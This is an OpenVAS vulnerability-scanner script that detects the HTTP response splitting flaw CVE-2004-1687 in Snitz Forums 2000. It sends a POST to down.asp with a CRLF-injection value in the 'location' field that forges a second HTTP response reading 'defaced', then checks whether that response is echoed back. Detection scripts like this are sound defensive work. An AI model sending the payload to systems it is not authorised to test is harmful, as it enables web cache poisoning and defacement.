###############################################################################
# OpenVAS Vulnerability Test
# $Id: snitz_down_http_xss.nasl 13679 2019-02-15 08:20:11Z cfischer $
#
# Snitz Forums 2000 HTTP Response Splitting
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2004 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# "Maestro De-Seguridad" <maestrodeseguridad@lycos.com>
# ADVISORY: security hole (http response splitting) in snitz forums 2000
# 2004-09-16 18:00

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14783");
  script_version("$Revision: 13679 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-15 09:20:11 +0100 (Fri, 15 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_cve_id("CVE-2004-1687");
  script_bugtraq_id(11201);
  script_name("Snitz Forums 2000 HTTP Response Splitting");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "cross_site_scripting.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade to the latest version of this software.");
  script_tag(name:"summary", value:"The remote host is using Snitz Forums 2000 - an ASP based forum/bbs.

 There is a bug in this software which makes it vulnerable to HTTP response
 splitting vulnerability.");
  script_tag(name:"impact", value:"An attacker may use this bug to perform web cache poisoning, xss attack, etc.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_asp(port:port))exit(0);

host = http_host_name( dont_add_port:TRUE );
if( http_get_has_generic_xss( port:port, host:host ) ) exit( 0 );

host = http_host_name( port:port );

foreach dir( make_list_unique( "/forum", "/forums", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  req = string("POST ", dir, "/down.asp HTTP/1.1\r\n",
  "Content-Type: application/x-www-form-urlencoded\r\n",
  "Host: ", host, "\r\n",
  "Content-length: 134\r\n",
  "\r\n",
  "location=/foo?%0d%0a%0d%0aHTTP/1.0%20200%20OK%0d%0aContent-Length:%2014%0d%0aContent-Type:%20text/html%0d%0a%0d%0a{html}defaced{/html}");
  r = http_keepalive_send_recv(port:port, data:req);
  if( isnull( r ) ) continue;

  if(string("HTTP/1.0 200 OK\r\nContent-Length: 14\r\nContent-Type: text/html\r\n\r\n{html}defaced{/html}\r\nContent-Length: ") >< r) {
    security_message( port:port );
    exit( 0 );
  }
}

exit(99);